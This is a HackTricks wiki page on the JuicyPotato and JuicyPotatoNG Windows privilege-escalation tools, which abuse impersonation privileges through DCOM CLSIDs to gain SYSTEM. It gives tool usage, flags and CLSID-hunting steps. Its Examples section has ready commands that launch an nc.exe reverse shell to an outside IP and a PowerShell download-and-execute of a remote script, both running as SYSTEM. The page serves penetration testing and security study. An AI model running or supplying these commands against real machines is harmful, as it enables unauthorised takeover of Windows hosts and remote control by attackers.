---
title: "JuicyPotato"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/windows-hardening/windows-local-privilege-escalation/juicypotato.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: windows
---

## Juicy Potato (abusing the golden privileges)

*A sugared version of* *RottenPotatoNG**, with a bit of juice, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM***[\[1\]](#references)

#### [You can download juicypotato from](#you-can-download-juicypotato-from-httpsciappveyorcomprojectohpejuicy-potatobuildartifacts) [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Compatibility quick notes

- Works reliably up to Windows 10 1803 and Windows Server 2016 when the current context has SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege.
- Broken by Microsoft hardening in Windows 10 1809 / Windows Server 2019 and later. Prefer the alternatives linked above for those builds.

### Summary

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on `BITS`[service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

We decided to weaponize [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Say hello to Juicy Potato**.

For the theory, see [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) and follow the chain of links and references.[\[4\]](#references)

Besides `BITS`, several COM servers can be abused. They only need to:

1. be instantiable by the current user, normally a “service user” which has impersonation privileges
2. implement the `IMarshal` interface
3. run as an elevated user (SYSTEM, Administrator, …)

After some testing we obtained and tested an extensive list of [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) on several Windows versions.

### Juicy details

JuicyPotato allows you to:[\[1\]](#references)

- **Target CLSID***pick any CLSID you want.*[*Here*](http://ohpe.it/juicy-potato/CLSID/)*you can find the list organized by OS.*
- **COM Listening port***define COM listening port you prefer (instead of the marshalled hardcoded 6666)*
- **COM Listening IP address***bind the server on any IP*
- **Process creation mode***depending on the impersonated user’s privileges you can choose from:*  - `CreateProcessWithToken` (needs`SeImpersonate` )
  - `CreateProcessAsUser` (needs`SeAssignPrimaryToken` )
  - `both`
- **Process to launch***launch an executable or script if the exploitation succeeds*
- **Process Argument***customize the launched process arguments*
- **RPC Server address***for a stealthy approach you can authenticate to an external RPC server*
- **RPC Server port***useful if you want to authenticate to an external server and firewall is blocking port `135`…*
- **TEST mode***mainly for testing purposes, i.e. testing CLSIDs. It creates the DCOM and prints the user of token. See*[*here for testing*](http://ohpe.it/juicy-potato/Test/)

### Usage

```
T:\>JuicyPotato.exe
JuicyPotato v0.1
Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port
Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Final thoughts

If the user has `SeImpersonate` or `SeAssignPrimaryToken` privileges then you are **SYSTEM**.

It’s nearly impossible to prevent the abuse of all these COM Servers. You could think about modifying the permissions of these objects via `DCOMCNFG` but good luck, this is gonna be challenging.

The actual solution is to protect sensitive accounts and applications which run under the `* SERVICE` accounts. Stopping `DCOM` would certainly inhibit this exploit but could have a serious impact on the underlying OS.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)[\[3\]](#references)

## JuicyPotatoNG (2022+)

JuicyPotatoNG re-introduces a JuicyPotato-style local privilege escalation on modern Windows by combining:[\[2\]](#references)

- DCOM OXID resolution to a local RPC server on a chosen port, avoiding the old hardcoded 127.0.0.1:6666 listener.
- An SSPI hook to capture and impersonate the inbound SYSTEM authentication without requiring RpcImpersonateClient, which also enables CreateProcessAsUser when only SeAssignPrimaryTokenPrivilege is present.
- Tricks to satisfy DCOM activation constraints (e.g., the former INTERACTIVE-group requirement when targeting PrintNotify / ActiveX Installer Service classes).

Important notes (evolving behavior across builds):[\[2\]](#references)

- September 2022: Initial technique worked on supported Windows 10/11 and Server targets using the “INTERACTIVE trick”.
- January 2023 update from the authors: Microsoft later blocked the INTERACTIVE trick. A different CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) restores exploitation but only on Windows 11 / Server 2022 according to their post.

Basic usage (more flags in the help):

```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
If you’re targeting Windows 10 1809 / Server 2019 where classic JuicyPotato is patched, prefer the alternatives linked at the top (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, etc.). NG may be situational depending on build and service state.

## Examples

Note: Visit [this page](https://ohpe.it/juicy-potato/CLSID/) for a list of CLSIDs to try.

### Get a nc.exe reverse shell

```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
c:\Users\Public>
```
### Powershell rev

```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Launch a new CMD (if you have RDP access)

## CLSID Problems

Oftentimes, the default CLSID that JuicyPotato uses **doesn’t work** and the exploit fails. Usually, it takes multiple attempts to find a **working CLSID**. To get a list of CLSIDs to try for a specific operating system, you should visit this page:

### **Checking CLSIDs**

**Checking CLSIDs**

First, you will need some executables apart from juicypotato.exe.

Download [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) and load it into your PS session, and download and execute [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). That script will create a list of possible CLSIDs to test.

Then download [test_clsid.bat](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) (change the path to the CLSID list and to the juicypotato executable) and execute it. It will start trying every CLSID, and **when the port number changes, it will mean that the CLSID worked**.

**Check** the working CLSIDs **using the parameter -c**

## References

- [1] [Juicy Potato README (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [2] [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [3] [Juicy Potato project page (ohpe.it)](http://ohpe.it/juicy-potato/)
- [4] [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
